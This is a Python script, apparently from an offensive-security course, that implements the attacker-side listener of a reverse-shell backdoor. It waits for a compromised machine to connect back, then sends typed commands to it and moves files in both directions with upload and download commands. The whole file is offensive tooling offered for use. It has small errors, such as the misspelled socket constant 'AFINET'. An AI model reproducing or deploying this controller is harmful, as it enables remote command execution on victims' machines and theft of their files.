import socket
import base64
import simplejson
import optparse

class SocketListener:
    def __init__(self,ip,port):
        my_listener = socket.socket(socket.AFINET,socket.SOCK_STREAM)
        my_listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        # to use this instance more than one time
        my_listener.bind((ip,port))
        my_listener.listen(0)
        print("Listening...")
        (self.my_connection,my_address) = my_listener.accept()
        print("Connection OK from" + str(my_address))
        
    def json_send(self,data):
        json_data = simplejson.dumps(data)
        self.my_connection.send(json_data.encode("utf-8"))
        
    def json_recieve(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.my_connection.recv(1024).decode()
                return simplejson.loads(json_data)
            except ValueError:
                continue
        
    def command_execution(self,command_input):
        self.json_send(command_input)
        if command_input[0] == "quit":
            self.my_connection.close()
            exit()
        return self.json_recieve()
    
    def save_file(self,path,content):
        with open(path,"wb") as my_file:
            my_file.write(base64.b64decode(content))
            return "Download completed"
        
    def get_file_content(self,path):
        with open(path,"rb") as my_file:
            return base64.b64encode(my_file.read())
        
    def start_listening(self):
        while True:
            command_input = input("Enter command: ")
            command_input = command_input.split(" ")
            try:
                if command_input[0] == "upload":
                    my_file_content = self.get_file_content(command_input[1])
                    command_input.append(my_file_content)
                command_output = self.command_execution(command_input)
                if command_input[0] == "download" and "Error!!" not in command_output:
                    command_output = self.save_file(command_input[1],command_output)
            except Exception:
                command_output = "Error!!"        
            print(command_output)
def get_input():
    parse_obj = optparse.OptionParser()
    parse_obj.add_option("-i","--ipaddress",dest="ip",help="Enter IP address")
    parse_obj.add_option("-p","--port",dest="port",help="Enter port number")
    return parse_obj.parse_args()

user_input = get_input()[0]
mySocket_listener = SocketListener(user_input.ip,user_input.port)
mySocket_listener.start_listening()